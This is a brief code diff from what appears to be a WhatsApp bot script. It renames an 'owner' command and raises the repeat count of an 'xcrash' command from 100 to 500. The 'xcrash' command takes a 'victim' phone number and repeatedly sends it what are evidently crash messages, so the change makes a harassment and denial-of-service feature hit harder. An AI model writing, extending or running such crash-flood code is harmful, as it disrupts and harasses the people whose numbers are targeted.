@@ -1006,7 +1006,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                     quoted: m
                 })
                 break
-case 'owner': {
+case 'ranzkroco': {
 const repf = await XeonBotInc.sendMessage(from, { 
 contacts: { 
 displayName: `${list.length} Contact`, 
@@ -1883,7 +1883,7 @@ case 'xcrash':{
 if (!isPremium) return replygcxeon(mess.prem)
  if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
  victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
+amount = "500"
 for (let i = 0; i < amount; i++) {
 XeonyCrashy(pushname,victim)
 await sleep(3000)
